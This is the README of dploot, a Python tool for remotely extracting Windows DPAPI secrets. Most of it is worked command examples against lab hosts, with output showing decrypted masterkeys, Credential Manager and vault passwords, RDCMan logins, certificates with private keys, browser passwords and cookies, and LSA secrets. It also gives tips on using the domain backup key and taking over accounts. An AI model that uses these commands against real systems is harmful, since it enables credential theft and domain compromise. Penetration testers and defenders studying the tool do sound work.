# dploot

dploot is Python rewrite of [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) written un C# by [Harmj0y](https://twitter.com/harmj0y), which is itself a port of DPAPI from [Mimikatz](https://github.com/gentilkiwi/mimikatz/) by [gentilkiwi](https://twitter.com/gentilkiwi). It implements all the DPAPI logic of these tools, but this time it is usable with a python interpreter and from a Linux environment.

If you don't know what is DPAPI, [check out this post](https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107).

## Table of Contents

- [dploot](#dploot)
  - [Table of Contents](#table-of-contents)
  - [Usage](#usage)
  - [How to use](#how-to-use)
  - [Commands](#commands)
    - [User Triage](#user-triage)
      - [masterkeys](#masterkeys)
      - [credentials](#credentials)
      - [vaults](#vaults)
      - [rdg](#rdg)
      - [certificates](#certificates)
      - [browser](#browser)
      - [triage](#triage)
    - [Machine Triage](#machine-triage)
      - [machinemasterkeys](#machinemasterkeys)
      - [machinecredentials](#machinecredentials)
      - [machinevaults](#machinevaults)
      - [machinecertificates](#machinecertificates)
      - [machinetriage](#machinetriage)
    - [Misc](#misc)
      - [wifi](#wifi)
      - [backupkey](#backupkey)
  - [Credits](#credits)
  - [TODO](#TODO)

## Installation

To install dploot, use pipx (best solution to avoid conflict with other project dependencies):

```text
git clone https://github.com/zblurx/dploot
cd dploot
python3 -m pipx install .
```

Pip is a good solution too

## Usage

```text
usage: dploot [-h] [-debug]
              {certificates,credentials,masterkeys,vaults,backupkey,rdg,triage,machinemasterkeys,machinecredentials,machinevaults,machinecertificates,machinetriage,browser,wifi}
              ...

DPAPI looting remotely in Python

positional arguments:
  {certificates,credentials,masterkeys,vaults,backupkey,rdg,triage,machinemasterkeys,machinecredentials,machinevaults,machinecertificates,machinetriage,browser,wifi}
                        Action
    certificates        Dump users certificates from remote target
    credentials         Dump users Credential Manager blob from remote target
    masterkeys          Dump users masterkey from remote target
    vaults              Dump users Vaults blob from remote target
    backupkey           Backup Keys from domain controller
    rdg                 Dump users saved password information for RDCMan.settings from remote target
    triage              Loot Masterkeys (if not set), credentials, rdg, certificates, browser and vaults from remote target
    machinemasterkeys   Dump system masterkey from remote target
    machinecredentials  Dump system credentials from remote target
    machinevaults       Dump system vaults from remote target
    machinecertificates
                        Dump system certificates from remote target
    machinetriage       Loot SYSTEM Masterkeys (if not set), SYSTEM credentials, SYSTEM certificates and SYSTEM vaults from remote target
    browser             Dump users credentials and cookies saved in browser from remote target
    wifi                Dump wifi profiles from remote target

options:
  -h, --help            show this help message and exit
  -debug                Turn DEBUG output ON
```

## How to use

The goal of dploot is to simplify DPAPI related loot from a Linux box. As SharpDPAPI, how you use this tool will depend on if you compromised the domain or not.

If you have domain admin privileges, you can obtain the domain DPAPI backup key with the backupkey command. This key can decrypt any DPAPI masterkeys for domain users and computers, and it will never change. Therefore, this key allow attacker to loot any DPAPI protected password realted to a domain user.

If domain admin privileges have not been obtained (yet), using Mimikatz' sekurlsa::dpapi command will retrieve DPAPI masterkey {GUID}:SHA1 mappings of any loaded master keys (user and SYSTEM) on a given system (tip: running dpapi::cache after key extraction will give you a nice table). If you change these keys to a {GUID1}:SHA1 {GUID2}:SHA1... type format, they can be supplied to dploot to triage the box. Use can also use [lsassy](https://github.com/Hackndo/lsassy) to harvest decrypted masterkeys.

## Commands

### User Triage

#### masterkeys

The **masterkeys** command will get any user masterkey file and decrypt them with `-passwords FILE` combo of user:password, `-nthashes` combo of user:nthash or a `-pvk PVKFILE` domain backup key. It will return a set of masterkey {GUID}:SHA1 mappings. Note that it will try to use password or nthash that you used to connect to the target even if you don't specify corresponding options.

*With domain backupkey*:

```text
$ dploot masterkeys waza.local/Administrator:'Password!123'@192.168.57.5 -pvk key.pvk
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)
[*] Found MasterKey: \\192.168.57.5\C$\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2239934126-3187342257-2761709825-500\927478ee-ab0e-4958-9eed-1d99f4dd851f
[*] Found MasterKey: \\192.168.57.5\C$\Users\jfile\AppData\Roaming\Microsoft\Protect\S-1-5-21-2239934126-3187342257-2761709825-1106\7eb68c18-1533-4448-8328-dd4e8439059a
[*] Found MasterKey: \\192.168.57.5\C$\Users\jfile\AppData\Roaming\Microsoft\Protect\S-1-5-21-2239934126-3187342257-2761709825-1106\dc22a574-7721-4d0e-8fbe-b1d4be93a73e
[*] Found MasterKey: \\192.168.57.5\C$\Users\jsmith\AppData\Roaming\Microsoft\Protect\S-1-5-21-2239934126-3187342257-2761709825-1104\34fb7a8f-13b9-45f7-9588-9be6f77513d4
[*] Found MasterKey: \\192.168.57.5\C$\Users\pigeon\AppData\Roaming\Microsoft\Protect\S-1-5-21-2004071915-2714639843-996485644-1001\bc6677c5-6403-49d1-a06b-6f03a5d13dc2
[*] Found MasterKey: \\192.168.57.5\C$\Users\scroche\AppData\Roaming\Microsoft\Protect\S-1-5-21-2239934126-3187342257-2761709825-1105\ab0397f3-c1dd-4ceb-a4ee-cdb454e2a2a8

{927478ee-ab0e-4958-9eed-1d99f4dd851f}:d87445e47dc40cab8cd[...]
{7eb68c18-1533-4448-8328-dd4e8439059a}:abd03218f36ab1a8ded[...]
{dc22a574-7721-4d0e-8fbe-b1d4be93a73e}:40fc4ad7642e0fd5a25[...]
{34fb7a8f-13b9-45f7-9588-9be6f77513d4}:4237fe409ef39ad163d[...]
{ab0397f3-c1dd-4ceb-a4ee-cdb454e2a2a8}:586ad9435a925bdf613[...]
```

*With password*:

```text
$ cat passwords
jsmith:Password#123
$ dploot masterkeys waza.local/jsmith:Password#123@192.168.56.14 -passwords passwords
[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)
[*] Triage ALL USERS masterkeys

[*] Found MasterKey: \\192.168.56.14\C$\Users\jsmith\AppData\Roaming\Microsoft\Protect\S-1-5-21-267175082-2660600898-836655089-1103\d305b55b-f0ca-40cf-b04c-3620aa5da427
[*] Found MasterKey: \\192.168.56.14\C$\Users\pigeon\AppData\Roaming\Microsoft\Protect\S-1-5-21-448572974-3439994363-1960186206-1001\f03e5af7-a6c0-4018-9fad-3391273952be

{d305b55b-f0ca-40cf-b04c-3620aa5da427}:6f45f9ee77014df8a68104abd0e8d5eadb3d9f22
```

***Tips***: *With the `outputfile` flag, dploot masterkeys will append looted masterkeys in a specified file. It is not a problem to store every masterkeys in the same file, because a DPAPI BLOB store the GUID of the masterkey that will be needed in order to decrypt it.*

#### credentials

The **credentials** command will search for users Credential files and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, or with `-passwords FILE` combo of user:password, `-nthashes` combo of user:nthash or a `-pvk PVKFILE` to first decrypt masterkeys.

With `mkfile`:

```text
$ dploot credentials waza.local/Administrator:'Password!123'@192.168.57.5 -mkfile waza.mkf
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)
[*] Found Credential Manager blob: \\192.168.57.5\C$\Users\jfile\AppData\Roaming\Microsoft\Credentials\FF6A8B05D0BD996DD3A9D76D69244D80
[CREDENTIAL]
LastWritten : 2022-04-12 16:55:44
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=test
Description :
Unknown     :
Username    : test
Unknown     : Password#{123}

[*] Found Credential Manager blob: \\192.168.57.5\C$\Users\jsmith\AppData\Local\Microsoft\Credentials\B7940EED205293A0414498F8F866E091
[CREDENTIAL]
LastWritten : 2022-04-27 19:23:02
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000002 (CRED_PERSIST_LOCAL_MACHINE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=TERMSRV/srv01.waza.local
Description :
Unknown     :
Username    : DESKTOP-I60R2L6\Administrator
Unknown     : Password!123
```

With `pvk`:

```text
$ dploot credentials waza.local/Administrator:'Password!123'@192.168.57.5 -pvk key.pvk
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)
[*] Found MasterKey: \\192.168.57.5\C$\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2239934126-3187342257-2761709825-500\927478ee-ab0e-4958-9eed-1d99f4dd851f
[*] Found MasterKey: \\192.168.57.5\C$\Users\jfile\AppData\Roaming\Microsoft\Protect\S-1-5-21-2239934126-3187342257-2761709825-1106\7eb68c18-1533-4448-8328-dd4e8439059a
[*] Found MasterKey: \\192.168.57.5\C$\Users\jfile\AppData\Roaming\Microsoft\Protect\S-1-5-21-2239934126-3187342257-2761709825-1106\dc22a574-7721-4d0e-8fbe-b1d4be93a73e
[*] Found MasterKey: \\192.168.57.5\C$\Users\jsmith\AppData\Roaming\Microsoft\Protect\S-1-5-21-2239934126-3187342257-2761709825-1104\34fb7a8f-13b9-45f7-9588-9be6f77513d4
[*] Found MasterKey: \\192.168.57.5\C$\Users\pigeon\AppData\Roaming\Microsoft\Protect\S-1-5-21-2004071915-2714639843-996485644-1001\bc6677c5-6403-49d1-a06b-6f03a5d13dc2
[*] Found MasterKey: \\192.168.57.5\C$\Users\scroche\AppData\Roaming\Microsoft\Protect\S-1-5-21-2239934126-3187342257-2761709825-1105\ab0397f3-c1dd-4ceb-a4ee-cdb454e2a2a8
[*] Found Credential Manager blob: \\192.168.57.5\C$\Users\jfile\AppData\Roaming\Microsoft\Credentials\FF6A8B05D0BD996DD3A9D76D69244D80
[CREDENTIAL]
LastWritten : 2022-04-12 16:55:44
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=test
Description :
Unknown     :
Username    : test
Unknown     : Password#{123}

[*] Found Credential Manager blob: \\192.168.57.5\C$\Users\jsmith\AppData\Local\Microsoft\Credentials\B7940EED205293A0414498F8F866E091
[CREDENTIAL]
LastWritten : 2022-04-27 19:23:02
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000002 (CRED_PERSIST_LOCAL_MACHINE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=TERMSRV/srv01.waza.local
Description :
Unknown     :
Username    : DESKTOP-I60R2L6\Administrator
Unknown     : Password!123
```

#### vaults

The **vaults** command will search for users Vaults secrets and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, or with `-passwords FILE` combo of user:password, `-nthashes` combo of user:nthash or a `-pvk PVKFILE` to first decrypt masterkeys.

With `mkfile`:

```text
$ dploot vaults waza.local/jsmith:Password#123@192.168.56.14 -mkfile waza.local.mkf
[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)
[*] Triage Vaults for ALL USERS

[*] Found Vault Directory: \\192.168.56.14\C$\Users\jsmith\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

[VAULT_VPOL_KEYS]
Key1: 0x552f5d5b454d3a53aec4ff458539de02
Key2: 0x5565757b5acd988e1a7377030fbe7098bff3e98050ae9bca458fe554b9e2586b

[Internet Explorer]
Username        : test
Resource        : http://testphp.vulnweb.com/
Password        : b'74006500730074000000'

Decoded Password: test
```

With `pvk`:

```text
$ dploot vaults waza.local/jsmith:Password#123@192.168.56.14 -pvk key.pvk
[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)
[*] Triage ALL USERS masterkeys

[*] Found MasterKey: \\192.168.56.14\C$\Users\jsmith\AppData\Roaming\Microsoft\Protect\S-1-5-21-267175082-2660600898-836655089-1103\d305b55b-f0ca-40cf-b04c-3620aa5da427
[*] Found MasterKey: \\192.168.56.14\C$\Users\pigeon\AppData\Roaming\Microsoft\Protect\S-1-5-21-448572974-3439994363-1960186206-1001\f03e5af7-a6c0-4018-9fad-3391273952be
{d305b55b-f0ca-40cf-b04c-3620aa5da427}:6f45f9ee77014df8a68104abd0e8d5eadb3d9f22
[*] Triage Vaults for ALL USERS

[*] Found Vault Directory: \\192.168.56.14\C$\Users\jsmith\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

[VAULT_VPOL_KEYS]
Key1: 0x552f5d5b454d3a53aec4ff458539de02
Key2: 0x5565757b5acd988e1a7377030fbe7098bff3e98050ae9bca458fe554b9e2586b

[Internet Explorer]
Username        : test
Resource        : http://testphp.vulnweb.com/
Password        : b'74006500730074000000'

Decoded Password: test
```

#### rdg

The **rdg** command will search for users RDCMan.settings files secrets and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, or with `-passwords FILE` combo of user:password, `-nthashes` combo of user:nthash or a `-pvk PVKFILE` to first decrypt masterkeys.

With `mkfile`:

```text
$ dploot rdg waza.local/jsmith:Password#123@192.168.56.14 -mkfile waza.local.mkf
[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)

[*] Found RDCMan Settings for jsmith user
RDCMAN File: \\192.168.56.14\C$\Users\jsmith\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
[CREDENTIAL PROFILES]
        Profile Name:   WAZA\Administrator
        Username:       WAZA\Administrator
        Password:       Placeholder1234567890

[LOGON PROFILES]
        Profile Name:   Custom
        Username:       WAZA\Administrator
        Password:       Password!123

[*] Found RDG file: C:\Users\jsmith\Documents\letzgo.rdg
[SERVER PROFILES]
        Name:           DC01.waza.local
        Profile Name:   Custom
        Username:       WAZA\jdoe
        Password:       Password#123

[SERVER PROFILES]
        Name:           SRV01.waza.local
        Profile Name:   Custom
        Username:       WAZA\jfile
        Password:       Password#123
```

With `pvk`:

```text
dploot rdg waza.local/jsmith:Password#123@192.168.56.14 -pvk key.pvk
[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)
[*] Triage ALL USERS masterkeys

[*] Found MasterKey: \\192.168.56.14\C$\Users\jsmith\AppData\Roaming\Microsoft\Protect\S-1-5-21-267175082-2660600898-836655089-1103\d305b55b-f0ca-40cf-b04c-3620aa5da427
[*] Found MasterKey: \\192.168.56.14\C$\Users\pigeon\AppData\Roaming\Microsoft\Protect\S-1-5-21-448572974-3439994363-1960186206-1001\f03e5af7-a6c0-4018-9fad-3391273952be
{d305b55b-f0ca-40cf-b04c-3620aa5da427}:6f45f9ee77014df8a68104abd0e8d5eadb3d9f22
[*] Found RDCMan Settings for jsmith user
RDCMAN File: \\192.168.56.14\C$\Users\jsmith\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
[CREDENTIAL PROFILES]
        Profile Name:   WAZA\Administrator
        Username:       WAZA\Administrator
        Password:       Placeholder1234567890

[LOGON PROFILES]
        Profile Name:   Custom
        Username:       WAZA\Administrator
        Password:       Password!123

[*] Found RDG file: C:\Users\jsmith\Documents\letzgo.rdg
[SERVER PROFILES]
        Name:           DC01.waza.local
        Profile Name:   Custom
        Username:       WAZA\jdoe
        Password:       Password#123

[SERVER PROFILES]
        Name:           SRV01.waza.local
        Profile Name:   Custom
        Username:       WAZA\jfile
        Password:       Password#123
```

#### certificates

The **certificates** command will search for users certificates from *MY* and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, or with `-passwords FILE` combo of user:password, `-nthashes` combo of user:nthash or a `-pvk PVKFILE` to first decrypt masterkeys.

With `mkfile`:

```text
$ dploot certificates waza.local/Administrator:'Password!123'@192.168.57.5 -mkfile waza.mkf
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)
[*] Found PrivateKey Blob: \\192.168.57.5\C$\Users\jsmith\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-2239934126-3187342257-2761709825-1104\3dce313258d2d89bd659c770dd4d9bb8_a14e72b0-8859-4206-8d30-211c4f03281b
[*] Found Certificates Blob: \\192.168.57.5\C$\Users\jsmith\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\8F4463B200970B8ECC8FFCDC2AB152478AB654AE
[*] Found match between 8F4463B200970B8ECC8FFCDC2AB152478AB654AE certificate and 3dce313258d2d89bd659c770dd4d9bb8_a14e72b0-8859-4206-8d30-211c4f03281b private key !

Issuer:			CN=waza-SRV01-CA,DC=waza,DC=local
Subject:		CN=John Smith,CN=Users,DC=waza,DC=local
Valid Date:		2022-04-14 13:58:46
Expiry Date:		2023-04-14 13:58:46
Extended Key Usage:
	Unknown OID (1.3.6.1.4.1.311.10.3.4)
	emailProtection (1.3.6.1.5.5.7.3.4)
	clientAuth (1.3.6.1.5.5.7.3.2)
	[!] Certificate is used for client auth!

-----BEGIN CERTIFICATE-----
MIIFvjCCBKagAwIBAgITZQAAAIG+kiOSy5YNoQAAAAAAgTANBgkqhkiG9w0BAQsF
[...]
Ite9xByUf01wuPBUgtJr559zNAhg72pY6rGkja7Ky97bjw==
-----END CERTIFICATE-----

[*] Writting certificate to 8F4463B200970B8ECC8FFCDC2AB152478AB654AE.pfx
```

With `pvk`:

```text
$ dploot certificates waza.local/Administrator:'Password!123'@192.168.57.5 -pvk key.pvk
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)
[*] Found MasterKey: \\192.168.57.5\C$\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2239934126-3187342257-2761709825-500\927478ee-ab0e-4958-9eed-1d99f4dd851f
[*] Found MasterKey: \\192.168.57.5\C$\Users\jfile\AppData\Roaming\Microsoft\Protect\S-1-5-21-2239934126-3187342257-2761709825-1106\7eb68c18-1533-4448-8328-dd4e8439059a
[*] Found MasterKey: \\192.168.57.5\C$\Users\jfile\AppData\Roaming\Microsoft\Protect\S-1-5-21-2239934126-3187342257-2761709825-1106\dc22a574-7721-4d0e-8fbe-b1d4be93a73e
[*] Found MasterKey: \\192.168.57.5\C$\Users\jsmith\AppData\Roaming\Microsoft\Protect\S-1-5-21-2239934126-3187342257-2761709825-1104\34fb7a8f-13b9-45f7-9588-9be6f77513d4
[*] Found MasterKey: \\192.168.57.5\C$\Users\pigeon\AppData\Roaming\Microsoft\Protect\S-1-5-21-2004071915-2714639843-996485644-1001\bc6677c5-6403-49d1-a06b-6f03a5d13dc2
[*] Found MasterKey: \\192.168.57.5\C$\Users\scroche\AppData\Roaming\Microsoft\Protect\S-1-5-21-2239934126-3187342257-2761709825-1105\ab0397f3-c1dd-4ceb-a4ee-cdb454e2a2a8
[*] Found PrivateKey Blob: \\192.168.57.5\C$\Users\jsmith\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-2239934126-3187342257-2761709825-1104\3dce313258d2d89bd659c770dd4d9bb8_a14e72b0-8859-4206-8d30-211c4f03281b
[*] Found Certificates Blob: \\192.168.57.5\C$\Users\jsmith\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\8F4463B200970B8ECC8FFCDC2AB152478AB654AE
[*] Found match between 8F4463B200970B8ECC8FFCDC2AB152478AB654AE certificate and 3dce313258d2d89bd659c770dd4d9bb8_a14e72b0-8859-4206-8d30-211c4f03281b private key !

Issuer:			CN=waza-SRV01-CA,DC=waza,DC=local
Subject:		CN=John Smith,CN=Users,DC=waza,DC=local
Valid Date:		2022-04-14 13:58:46
Expiry Date:		2023-04-14 13:58:46
Extended Key Usage:
	Unknown OID (1.3.6.1.4.1.311.10.3.4)
	emailProtection (1.3.6.1.5.5.7.3.4)
	clientAuth (1.3.6.1.5.5.7.3.2)
	[!] Certificate is used for client auth!

-----BEGIN CERTIFICATE-----
MIIFvjCCBKagAwIBAgITZQAAAIG+kiOSy5YNoQAAAAAAgTANBgkqhkiG9w0BAQsF
[...]
Ite9xByUf01wuPBUgtJr559zNAhg72pY6rGkja7Ky97bjw==
-----END CERTIFICATE-----

[*] Writting certificate to 8F4463B200970B8ECC8FFCDC2AB152478AB654AE.pfx
```

***Tips***: *If you get a certificate with client authentication EKU, you can takeover the account with [certipy](https://github.com/ly4k/Certipy).*

#### browser

The **browser** command will search for users password and cookies in chrome based browsers, and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, or with `-passwords FILE` combo of user:password, `-nthashes` combo of user:nthash or a `-pvk PVKFILE` to first decrypt masterkeys.

With `mkfile`:

```text
$ dploot browser waza.local/Administrator:'Password!123'@192.168.57.5 -mkfile waza.mkf
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)
[*] Found MSEDGE AppData files for user Administrator
[MSEDGE LOGIN DATA]
URL:		
Username:	admin
Password:	Password!123

[MSEDGE COOKIE DATA]
Host (path):		www.bing.com (/)
Cookie Name:		ESF
Cookie Value:		1
Creation UTC:		Apr 07 2022 21:27:49
Expires UTC:		Jan 01 1601 00:00:00
Last Access UTC:	Apr 07 2022 21:29:12
```

With `pvk`:

```text
$ dploot browser waza.local/Administrator:'Password!123'@192.168.57.5 -pvk key.pvk
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)
[*] Found MasterKey: \\192.168.57.5\C$\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2239934126-3187342257-2761709825-500\927478ee-ab0e-4958-9eed-1d99f4dd851f
[*] Found MasterKey: \\192.168.57.5\C$\Users\jfile\AppData\Roaming\Microsoft\Protect\S-1-5-21-2239934126-3187342257-2761709825-1106\7eb68c18-1533-4448-8328-dd4e8439059a
[*] Found MasterKey: \\192.168.57.5\C$\Users\jfile\AppData\Roaming\Microsoft\Protect\S-1-5-21-2239934126-3187342257-2761709825-1106\dc22a574-7721-4d0e-8fbe-b1d4be93a73e
[*] Found MasterKey: \\192.168.57.5\C$\Users\jsmith\AppData\Roaming\Microsoft\Protect\S-1-5-21-2239934126-3187342257-2761709825-1104\34fb7a8f-13b9-45f7-9588-9be6f77513d4
[*] Found MasterKey: \\192.168.57.5\C$\Users\pigeon\AppData\Roaming\Microsoft\Protect\S-1-5-21-2004071915-2714639843-996485644-1001\bc6677c5-6403-49d1-a06b-6f03a5d13dc2
[*] Found MasterKey: \\192.168.57.5\C$\Users\scroche\AppData\Roaming\Microsoft\Protect\S-1-5-21-2239934126-3187342257-2761709825-1105\ab0397f3-c1dd-4ceb-a4ee-cdb454e2a2a8
[*] Found MSEDGE AppData files for user Administrator
[MSEDGE LOGIN DATA]
URL:		
Username:	admin
Password:	Password!123

[MSEDGE COOKIE DATA]
Host (path):		www.bing.com (/)
Cookie Name:		ESF
Cookie Value:		1
Creation UTC:		Apr 07 2022 21:27:49
Expires UTC:		Jan 01 1601 00:00:00
Last Access UTC:	Apr 07 2022 21:29:12
```

#### triage

The **triage** command runs the user [credentials](#credentials), [vaults](#vaults), [rdg](#rdg), and [certificates](#certificates) commands.

### Machine Triage

#### machinemasterkeys

The **machinemasterkeys** command will dump LSA secrets with RemoteRegistry to retrieve DPAPI_SYSTEM key which will the be used to decrypt any found machine masterkeys. It will return a set of masterkey {GUID}:SHA1 mappings.

```text
$ dploot machinemasterkeys waza.local/Administrator:'Password!123'@192.168.57.5
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x7d12d83df2060285163096f110c18535
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
[*] DPAPI_SYSTEM
[*] NL$KM
[*] Found SYSTEM system MasterKey: \\192.168.57.5\C$\Windows\System32\Microsoft\Protect\S-1-5-18\07e6e8d6-7eae-4780-9aac-641818ddd9bb
[*] Found SYSTEM system MasterKey: \\192.168.57.5\C$\Windows\System32\Microsoft\Protect\S-1-5-18\a87bcad8-5ed9-4f09-a9f7-34d77e20d0d4
[*] Found SYSTEM system MasterKey: \\192.168.57.5\C$\Windows\System32\Microsoft\Protect\S-1-5-18\d03a0e3b-b616-4a29-8795-9ca09960de35
[*] Found SYSTEM user MasterKey: \\192.168.57.5\C$\Windows\System32\Microsoft\Protect\S-1-5-18\User\69b3f620-eca1-45c1-a003-f1d0a8598c57
[*] Found SYSTEM user MasterKey: \\192.168.57.5\C$\Windows\System32\Microsoft\Protect\S-1-5-18\User\9a270191-3f43-46d1-9935-5892dca2a9a2
[*] Found SYSTEM user MasterKey: \\192.168.57.5\C$\Windows\System32\Microsoft\Protect\S-1-5-18\User\e85c4ab7-65d3-45df-9abe-829c2ead1c5f
{07e6e8d6-7eae-4780-9aac-641818ddd9bb}:ddb9fa17d4e9ab12[...]
{a87bcad8-5ed9-4f09-a9f7-34d77e20d0d4}:e4661cd36f07bb1f[...]
{d03a0e3b-b616-4a29-8795-9ca09960de35}:a45fdd01699bfbc5[...]
{69b3f620-eca1-45c1-a003-f1d0a8598c57}:2862216b21e96fa6[...]
{9a270191-3f43-46d1-9935-5892dca2a9a2}:d3cb43dd6645d26d[...]
{e85c4ab7-65d3-45df-9abe-829c2ead1c5f}:c2a118094fb7cf85[...]
```

#### machinecredentials

The **machinecredentials** command will get any machine Credentials file found and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, otherwise dploot will dump DPAPI_SYSTEM LSA secret key in order to decrypt any machine masterkeys, and then decrypt any found encrypted DPAPI XXX blob.

```text
$ dploot machinecredentials waza.local/Administrator:'Password!123'@192.168.57.5
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)
[*] Triage SYSTEM masterkeys

[*] Target system bootKey: 0x7d12d83df2060285163096f110c18535
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
[*] DPAPI_SYSTEM
[*] NL$KM
[*] Found SYSTEM system MasterKey: \\192.168.57.5\C$\Windows\System32\Microsoft\Protect\S-1-5-18\07e6e8d6-7eae-4780-9aac-641818ddd9bb
[*] Found SYSTEM system MasterKey: \\192.168.57.5\C$\Windows\System32\Microsoft\Protect\S-1-5-18\a87bcad8-5ed9-4f09-a9f7-34d77e20d0d4
[*] Found SYSTEM system MasterKey: \\192.168.57.5\C$\Windows\System32\Microsoft\Protect\S-1-5-18\d03a0e3b-b616-4a29-8795-9ca09960de35
[*] Found SYSTEM user MasterKey: \\192.168.57.5\C$\Windows\System32\Microsoft\Protect\S-1-5-18\User\69b3f620-eca1-45c1-a003-f1d0a8598c57
[*] Found SYSTEM user MasterKey: \\192.168.57.5\C$\Windows\System32\Microsoft\Protect\S-1-5-18\User\9a270191-3f43-46d1-9935-5892dca2a9a2
[*] Found SYSTEM user MasterKey: \\192.168.57.5\C$\Windows\System32\Microsoft\Protect\S-1-5-18\User\e85c4ab7-65d3-45df-9abe-829c2ead1c5f
{07e6e8d6-7eae-4780-9aac-641818ddd9bb}:ddb9fa17d4e9ab12[...]
{a87bcad8-5ed9-4f09-a9f7-34d77e20d0d4}:e4661cd36f07bb1f[...]
{d03a0e3b-b616-4a29-8795-9ca09960de35}:a45fdd01699bfbc5[...]
{69b3f620-eca1-45c1-a003-f1d0a8598c57}:2862216b21e96fa6[...]
{9a270191-3f43-46d1-9935-5892dca2a9a2}:d3cb43dd6645d26d[...]
{e85c4ab7-65d3-45df-9abe-829c2ead1c5f}:c2a118094fb7cf85[...]
[*] Found Credential Manager blob: \\192.168.57.5\C$\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
[*] Found Credential Manager blob: \\192.168.57.5\C$\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F408AEC20D1044EB4FCC8026E996F2C5
[CREDENTIAL]
LastWritten : 2022-05-06 15:51:53
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000002 (CRED_PERSIST_LOCAL_MACHINE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:batch=TaskScheduler:Task:{31424469-6CCD-4137-8DFF-541872FD3CBB}
Description :
Unknown     :
Username    : WAZA\Administrator
Unknown     : Password!123

[*] Found Credential Manager blob: \\192.168.57.5\C$\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
```

#### machinevaults

The **machinevaults** command will get any machine Vaults file found and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, otherwise dploot will dump DPAPI_SYSTEM LSA secret key in order to decrypt any machine masterkeys, and then decrypt any found encrypted DPAPI Vaults blob.

```text
$ dploot machinevaults waza.local/jsmith:Password#123@192.168.56.14 -debug
[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)
[*] Triage SYSTEM masterkeys

[+] Service RemoteRegistry is already running
[+] Retrieving class info for JD
[+] Retrieving class info for Skew1
[+] Retrieving class info for GBG
[+] Retrieving class info for Data
[*] Target system bootKey: 0x274b1776d8fbf01c6ff3f42aef542cf1
[+] Saving remote SECURITY database
[*] Dumping LSA Secrets
[+] Decrypting LSA Key
[+] Looking into $MACHINE.ACC
[*] $MACHINE.ACC
[+] Looking into DPAPI_SYSTEM
[*] DPAPI_SYSTEM
[+] Looking into NL$KM
[*] NL$KM
[*] Found SYSTEM system MasterKey: \\192.168.56.14\C$\Windows\System32\Microsoft\Protect\S-1-5-18\c1027a5b-0dcc-4237-af05-19839a94c12f
[*] Found SYSTEM system MasterKey: \\192.168.56.14\C$\Windows\System32\Microsoft\Protect\S-1-5-18\e1a73282-709b-4717-ace0-00eecb280fcc
[*] Found SYSTEM user MasterKey: \\192.168.56.14\C$\Windows\System32\Microsoft\Protect\S-1-5-18\User\6fbe7c89-9810-4ce3-b841-f0f1dd8b46e6
[*] Found SYSTEM user MasterKey: \\192.168.56.14\C$\Windows\System32\Microsoft\Protect\S-1-5-18\User\750630e8-b603-4d43-941e-6f756073e511

